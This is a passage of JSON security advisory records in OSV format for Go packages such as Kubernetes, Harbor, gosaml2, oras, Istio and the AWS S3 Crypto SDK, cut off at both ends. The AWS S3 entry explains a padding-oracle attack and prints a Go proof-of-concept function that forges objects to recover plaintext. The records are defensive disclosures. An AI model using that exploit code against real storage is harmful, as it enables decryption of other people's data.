"CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.10"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.16.0"}, {"fixed": "1.16.6"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.17.0"}, {"fixed": "1.17.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8551"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/89377"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/87913"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/9802bfcec0580169cffce2a3d468689a407fa7dc"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-security-announce/2UOlsba2g0s"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3SOCLOPTSYABTE4CLTSPDIFE6ZZZR4LX/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200413-0003/"}], "database_specific": {"cwe_ids": ["CWE-770", "CWE-789"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-06T21:53:58Z", "nvd_published_at": "2020-03-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-33p6-fx42-7rf5", "modified": "2021-05-24T19:08:11Z", "published": "2022-02-11T23:17:02Z", "aliases": ["CVE-2020-13788"], "summary": "Harbor is vulnerable to a limited Server-Side Request Forgery (SSRF) (CVE-2020-13788)", "details": "# Impact\nMatt Hamilton from Soluble has discovered a limited Server-Side Request Forgery (SSRF) that allowed Harbor project owners to scan the TCP ports of hosts on the Harbor server's internal network. \n\nThe vulnerability was immediately fixed by the Harbor team.  \n\n# Issue \nThe \u201cTest Endpoint\u201d API, part of the functionality for ensuring a project Webhook is accessible and functional, is vulnerable to a limited SSRF attack. A malicious user that is also a project administrator can use this API for internal port scanning.\n\n# Known Attack Vectors\nSuccessful exploitation of this issue will lead to bad actors identifying open TCP ports on any network that is accessible by the Harbor core services\n\n# Patches\nIf your product uses the affected releases of Harbor, update to version 2.0.1 to patch this issue immediately.\n\nhttps://github.com/goharbor/harbor/releases/tag/v2.0.1\n\n# Workarounds\nSince only project administrators (the user that created the project) are allowed to test the webhook endpoints configured in Harbor, a Harbor system administrator can control who is a project admin. In addition, Harbor system administrators can enforce a setting where only an administrator is allowed to create new projects instead of the default Everyone. This further restricts who can be a project administrator in Harbor.\n\n# For more information\nIf you have any questions or comments about this advisory, contact cncf-harbor-security@lists.cncf.io\nView our security policy at https://github.com/goharbor/harbor/security/policy\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-13788\nhttps://www.soluble.ai/blog/harbor-ssrf-cve-2020-13788", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "2.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-33p6-fx42-7rf5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13788"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases"}, {"type": "WEB", "url": "https://www.soluble.ai/blog/harbor-ssrf-cve-2020-13788"}, {"type": "WEB", "url": "https://www.youtube.com/watch?v=v8Isqy4yR3Q"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T19:08:11Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-85p9-j7c9-v4gr", "modified": "2023-08-29T18:49:34Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-10214"], "summary": "containers/image library Insufficiently Protects Credentials", "details": "The containers/image library used by the container tools Podman, Buildah, and Skopeo in Red Hat Enterprise Linux version 8 and CRI-O in OpenShift Container Platform, does not enforce TLS connections to the container registry authorization service. An attacker could use this vulnerability to launch a MiTM attack and steal login credentials or bearer tokens.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/image"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-10214"}, {"type": "WEB", "url": "https://github.com/containers/image/issues/654"}, {"type": "WEB", "url": "https://github.com/containers/image/pull/655"}, {"type": "WEB", "url": "https://github.com/containers/image/pull/669"}, {"type": "WEB", "url": "https://github.com/containers/image/commit/634605d06e738aec8332bcfd69162e7509ac7aaf"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1732508"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10214"}, {"type": "PACKAGE", "url": "https://github.com/containers/image"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0081"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00035.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-04/msg00041.html"}], "database_specific": {"cwe_ids": ["CWE-522"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-07T17:33:33Z", "nvd_published_at": "2019-11-25T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xhqq-x44f-9fgg", "modified": "2021-05-21T21:11:37Z", "published": "2022-02-11T23:58:09Z", "aliases": ["CVE-2020-29509"], "summary": "Authentication Bypass in github.com/russellhaering/gosaml2", "details": "### Impact\nGiven a valid SAML Response, it may be possible for an attacker to mutate the XML document in such a way that gosaml2 will trust a different portion of the document than was signed.\n\nDepending on the implementation of the Service Provider this enables a variety of attacks, including users accessing accounts other than the one to which they authenticated in the Identity Provider, or full authentication bypass.\n\n### Patches\nService Providers utilizing gosaml2 should upgrade to v0.6.0 or greater.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/gosaml2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/security/advisories/GHSA-xhqq-x44f-9fgg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29509"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/commit/42606dafba60c58c458f14f75c4c230459672ab9"}, {"type": "WEB", "url": "https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-attributes.md"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0060"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20210129-0006/"}], "database_specific": {"cwe_ids": ["CWE-115"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:11:37Z", "nvd_published_at": "2020-12-14T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g5v4-5x39-vwhx", "modified": "2022-10-25T20:26:42Z", "published": "2022-02-15T00:32:04Z", "aliases": ["CVE-2021-21272"], "summary": "Zip slip directory exploit in github.com/deislabs/oras", "details": "### Impact\nThe directory support (#55) allows the downloaded gzipped tarballs to be automatically extracted to the user-specified directory where the tarball can have symbolic links and hard links.\n\nA well-crafted tarball or tarballs allow malicious artifact providers linking, writing, or overwriting specific files on the host filesystem outside of the user-specified directory unexpectedly with the same permissions as the user who runs `oras pull`. \n\nPrecisely, the following users of the affected versions are impacted\n- `oras` CLI users who runs `oras pull`.\n- Go programs, which invokes `github.com/deislabs/oras/pkg/content.FileStore`.\n\n### Patches\nThe problem has been patched by the PR linked with this advisory. Users should upgrade their `oras` CLI and packages to `0.9.0`.\n\n### Workarounds\nFor `oras` CLI users, there is no workarounds other than pulling from a trusted artifact provider.\n\nFor `oras` package users, the workaround is to not use `github.com/deislabs/oras/pkg/content.FileStore`, and use other content stores instead, or pull from a trusted artifact provider.\n\n### References\n- [Zip Slip](https://github.com/snyk/zip-slip-vulnerability)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue on the [GitHub repo](https://github.com/deislabs/oras)\n* Email the [list of maintainers](https://github.com/deislabs/oras/blob/main/MAINTAINERS)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/deislabs/oras"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/deislabs/oras/security/advisories/GHSA-g5v4-5x39-vwhx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21272"}, {"type": "WEB", "url": "https://github.com/deislabs/oras/commit/96cd90423303f1bb42bd043cb4c36085e6e91e8e"}, {"type": "PACKAGE", "url": "https://github.com/deislabs/oras"}, {"type": "WEB", "url": "https://github.com/deislabs/oras/releases/tag/v0.9.0"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/deislabs/oras/pkg/oras"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0099"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:42:50Z", "nvd_published_at": "2021-01-25T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7f33-f4f5-xwgw", "modified": "2023-02-07T21:22:51Z", "published": "2022-02-11T23:23:13Z", "aliases": ["CVE-2020-8912"], "summary": "In-band key negotiation issue in AWS S3 Crypto SDK for golang", "details": "### Summary\n\nThe golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the GCM option was chosen as content cipher.\n\n### Risk/Severity\n\nThe vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThis advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non \"strict\" versions of C++ and Java S3 Crypto SDKs being present as well.\n\nV1 prior to 1.34.0 of the S3 crypto SDK does not authenticate the algorithm parameters for the data encryption key.\n\nAn attacker with write access to the bucket can use this in order to change the encryption algorithm of an object in the bucket, which can lead to problems depending on the supported algorithms. For example, a switch from AES-GCM to AES-CTR in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation.\n\nBy default, the only available algorithms in the SDK are AES-GCM and AES-CBC. Switching the algorithm from AES-GCM to AES-CBC can be used as way to reconstruct the plaintext through an oracle endpoint revealing decryption failures, by brute forcing 16 byte chunks of the plaintext. Note that the plaintext needs to have some known structure for this to work, as a uniform random 16 byte string would be the same as a 128 bit encryption key, which is considered cryptographically safe.\n\nThe attack works by taking a 16 byte AES-GCM encrypted block guessing 16 bytes of plaintext, constructing forgery that pretends to be PKCS5 padded AES-CBC, using the ciphertext and the plaintext guess and that will decrypt to a valid message if the guess was correct.\n\nTo understand this attack, we have to take a closer look at both AES-GCM and AES-CBC:\nAES-GCM encrypts using a variant of CTR mode, i.e. `C_i = AES-Enc(CB_i) ^ M_i`. AES-CBC on the other hand *decrypts* via `M_i = AES-Dec(C_i) ^ C_{i-1}`, where `C_{-1} = IV`. The padding oracle can tell us if, after switching to CBC mode, the plaintext recovered is padded with a valid PKCS5 padding.\n\nSince `AES-Dec(C_i ^ M_i) = CB_i`, if we set `IV' = CB_i ^ 0x10*[16]`, where `0x10*[16]` is the byte `0x10` repeated 16 times, and `C_0' = C_i ^ M_i'` the resulting one block message `(IV', C_0')` will have valid PKCS5 padding if our guess `M_i'` for `M_i` was correct, since the decrypted message consists of 16 bytes of value `0x10`, the PKCS5 padded empty string.\n\nNote however, that an incorrect guess might also result in a valid padding, if the AES decryption result randomly happens to end in `0x01`, `0x0202`, or a longer valid padding. In order to ensure that the guess was indeed correct, a second check using `IV'' = IV' ^ (0x00*[15] || 0x11)` with the same ciphertext block has to be performed. This will decrypt to 15 bytes of value `0x10` and one byte of value `0x01` if our initial guess was correct, producing a valid padding. On an incorrect guess, this second ciphertext forgery will have an invalid padding with a probability of 1:2^128, as one can easily see.\n\nThis issue is fixed in V2 of the API, by using the `KMS+context` key wrapping scheme for new files, authenticating the algorithm. Old files encrypted with the `KMS` key wrapping scheme remain vulnerable until they are reencrypted with the new scheme.\n\n### Mitigation\n\nUsing the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with GCM mode and use the `KMS` key wrapping option.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.\n\nThis particular issue is described in [combined_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/combined_oracle_exploit.go):\n\n```golang\nfunc CombinedOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {\n\tdata, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tif alg := header.Get(\"X-Amz-Meta-X-Amz-Cek-Alg\"); alg != \"AES/GCM/NoPadding\" {\n\t\treturn \"\", fmt.Errorf(\"Algorithm is %q, not GCM!\", alg)\n\t}\n\tgcmIv, err := base64.StdEncoding.DecodeString(header.Get(\"X-Amz-Meta-X-Amz-Iv\"))\n\tif len(gcmIv) != 12 {\n\t\treturn \"\", fmt.Errorf(\"GCM IV is %d bytes, not 12\", len(gcmIv))\n\t}\n\tfullIv := make([]byte, 16)\n\tconfirmIv := make([]byte, 16)\n\tfor i := 0; i < 12; i++ {\n\t\tfullIv[i] = gcmIv[i] ^ 0x10\n\t\tconfirmIv[i] = gcmIv[i] ^ 0x10\n\t}\n        // Set i to the block we want to attempt to decrypt\n\tcounter := i + 2\n\tfor j := 15; j >= 12; j-- {\n\t\tv := byte(counter % 256)\n\t\tfullIv[j] = 0x10 ^ v\n\t\tconfirmIv[j] = 0x10 ^ v\n\t\tcounter /= 256\n\t}\n\tconfirmIv[15] ^= 0x11\n\tfullIvEnc := base64.StdEncoding.EncodeToString(fullIv)\n\tconfirmIvEnc := base64.StdEncoding.EncodeToString(confirmIv)\n\tsuccess := false\n        // Set plaintextGuess to the guess for the plaintext of this block\n\tnewData := []byte(plaintextGuess)\n\tfor j := 0; j < 16; j++ {\n\t\tnewData[j] ^= data[16*i+j]\n\t}\n\tnewHeader := header.Clone()\n\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Cek-Alg\", \"AES/CBC/PKCS5Padding\")\n\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Iv\", fullIvEnc)\n\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\", \"16\")\n\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", newData, newHeader)\n\tif input.Oracle(bucket, key+\"guess\") {\n\t\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Iv\", confirmIvEnc)\n\t\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", newData, newHeader)\n\t\tif input.Oracle(bucket, key+\"guess\") {\n\t\t\treturn plaintextGuess, nil\n\t\t}\n\t}\n\treturn \"\", fmt.Errorf(\"Block %d could not be decrypted\", i)\n}\n```", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/aws/aws-sdk-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.34.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/security-research/security/advisories/GHSA-7f33-f4f5-xwgw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8912"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/pull/3403"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4"}, {"type": "WEB", "url": "https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1869801"}, {"type": "PACKAGE", "url": "https://github.com/aws/aws-sdk-go"}, {"type": "WEB", "url": "https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0646"}], "database_specific": {"cwe_ids": ["CWE-327"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T18:08:44Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q2qr-3c2p-9235", "modified": "2023-10-02T15:08:31Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-12758"], "summary": "Denial of Service (DoS) in HashiCorp Consul", "details": "HashiCorp Consul and Consul Enterprise could crash when configured with an abnormally-formed service-router entry. Introduced in 1.6.0, fixed in 1.6.6 and 1.7.4.\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/agent/consul/discoverychain", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0-beta1"}, {"fixed": "1.6.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12758"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/7783"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/69b44fb9424cfdc05f1b7243876ab10d236ef1fc"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.6.6/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.7.4/CHANGELOG.md"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-13T14:26:25Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q9vw-wr57-xjv3", "modified": "2023-02-03T00:34:34Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2017-15104"], "summary": "Information Exposure in Heketi", "details": "An access flaw was found in Heketi 5, where the heketi.json configuration file was world readable. An attacker having local access to the Heketi server could read plain-text passwords from the heketi.json file.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/heketi/heketi"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-15104"}, {"type": "WEB", "url": "https://github.com/heketi/heketi/commit/787bae461b23003a4daa4d1d639016a754cf6b00"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2017:3481"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2017-15104"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1510149"}, {"type": "WEB", "url": "https://github.com/heketi/heketi/releases/tag/v5.0.1"}], "database_specific": {"cwe_ids": ["CWE-552"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:48:28Z", "nvd_published_at": "2017-12-18T19:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cg3q-j54f-5p7p", "modified": "2022-02-25T15:41:10Z", "published": "2022-02-16T22:26:35Z", "aliases": ["CVE-2022-21698"], "summary": "Uncontrolled Resource Consumption in promhttp", "details": "This is the Go client library for Prometheus. It has two separate parts, one for instrumenting application code, and one for creating clients that talk to the Prometheus HTTP API. client_golang is the instrumentation library for Go applications in Prometheus, and the promhttp package in client_golang provides tooling around HTTP servers and clients.\n\n### Impact\n\nHTTP server susceptible to a Denial of Service through unbounded cardinality, and potential memory exhaustion, when handling requests with non-standard HTTP methods.\n\n###  Affected Configuration\n\nIn order to be affected, an instrumented software must\n\n* Use any of `promhttp.InstrumentHandler*` middleware except `RequestsInFlight`.\n* Do not filter any specific methods (e.g GET) before middleware.\n* Pass metric with `method` label name to our middleware.\n* Not have any firewall/LB/proxy that filters away requests with unknown `method`.\n\n### Patches\n\n* https://github.com/prometheus/client_golang/pull/962\n* https://github.com/prometheus/client_golang/pull/987\n\n### Workarounds\n\nIf you cannot upgrade to [v1.11.1 or above](https://github.com/prometheus/client_golang/releases/tag/v1.11.1), in order to stop being affected you can:\n\n* Remove `method` label name from counter/gauge you use in the InstrumentHandler.\n* Turn off affected promhttp handlers.\n* Add custom middleware before promhttp handler that will sanitize the request method given by Go http.Request.\n* Use a reverse proxy or web application firewall, configured to only allow a limited set of methods.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in https://github.com/prometheus/client_golang\n* Email us at `prometheus-team@googlegroups.com`\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/client_golang"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/prometheus/client_golang/security/advisories/GHSA-cg3q-j54f-5p7p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21698"}, {"type": "WEB", "url": "https://github.com/prometheus/client_golang/pull/962"}, {"type": "WEB", "url": "https://github.com/prometheus/client_golang/pull/987"}, {"type": "PACKAGE", "url": "https://github.com/prometheus/client_golang"}, {"type": "WEB", "url": "https://github.com/prometheus/client_golang/releases/tag/v1.11.1"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2IK53GWZ475OQ6ENABKMJMTOBZG6LXUR/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2PFW6Q2LXXWTFRTMTRN4ZGADFRQPKJ3D/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/36GUEPA5TPSC57DZTPYPBL6T7UPQ2FRH/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3L6GDN5S5QZSCFKWD3GKL2RDZQ6B4UWA/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4KDETHL5XCT6RZN2BBNOCEXRZ2W3SFU3/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5OGNAFVXSMTTT2UPH6CS3IH6L3KM42Q7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7V7I72LSQ3IET3QJR6QPAVGJZ4CBDLN5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AK7CJBCGERCRXYUR2EWDSSDVAQMTAZGX/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DLUJZV3HBP56ADXU6QH2V7RNYUPMVBXQ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FY3N7H6VSDZM37B4SKM2PFFCUWU7QYWN/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HLAQRRGNSO5MYCPAXGPH2OCSHOGHSQMQ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/J5WPM42UR6XIBQNQPNQHM32X7S4LJTRX/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KBMVIQFKQDSSTHVVJWJ4QH6TW3JVB7XZ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MH6ALXEQXIFQRQFNJ5Y2MJ5DFPIX76VN/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RN7JGC2LVHPEGSJYODFUV5FEKPBVG4D7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SASRKYHT5ZFSVMJUQUG3UAEQRJYGJKAR/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZKORFJTRRDJCWBTJPISKKCVMMMJBIRLG/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZY2SLWOQR4ZURQ7UBRZ7JIX6H6F5JHJR/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0322"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-772"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-16T22:26:35Z", "nvd_published_at": "2022-02-15T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-82mm-ffjr-h86c", "modified": "2023-10-02T13:07:29Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-16844"], "summary": "Authorization bypass in Istio", "details": "In Istio 1.5.0 though 1.5.8 and Istio 1.6.0 through 1.6.7, when users specify an AuthorizationPolicy resource with DENY actions using wildcard suffixes (e.g. *-some-suffix) for source principals or namespace fields, callers will never be denied access, bypassing the intended policy.\n\n### Specific Go Packages Affected\nistio.io/istio/pilot/pkg/security/authz/model/matcher", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.9"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-16844"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/4c73414556b83f0e75c1b3a0a89a23103a71573c"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/72d2e135374f421b656d6f1a21f474db46134ace"}, {"type": "WEB", "url": "https://github.com/istio/istio/releases"}, {"type": "WEB", "url": "https://github.com/istio/istio/releases/tag/1.5.9"}, {"type": "WEB", "url": "https://github.com/istio/istio/releases/tag/1.6.8"}, {"type": "WEB", "url": "https://istio.io/latest/news/releases/1.5.x/announcing-1.5.9/"}, {"type": "WEB", "url": "https://istio.io/latest/news/releases/1.6.x/announcing-1.6.8/"}, {"type": "WEB", "url": "https://istio.io/latest/news/security/istio-security-2020-009/"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:59:07Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m4jx-6526-vvhm", "modified": "2021-05-12T20:38:22Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-28466"], "summary": "Denial of service in github.com/nats-io/nats-server/server", "details": "This affects all versions of package github.com/nats-io/nats-server/server. Untrusted accounts are able to crash the server using configs that represent a service export/import cycles. Disclaimer from the maintainers - Running a NATS service which is exposed to untrusted users presents a heightened risk. Any remote execution flaw or equivalent seriousness, or denial-of-service by unauthenticated users, will lead to prompt releases by the NATS maintainers. Fixes for denial of service issues with no threat of remote execution, when limited to account holders, are likely to just be committed to the main development branch with no special attention. Those who are running such services are encouraged to build regularly from git.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": 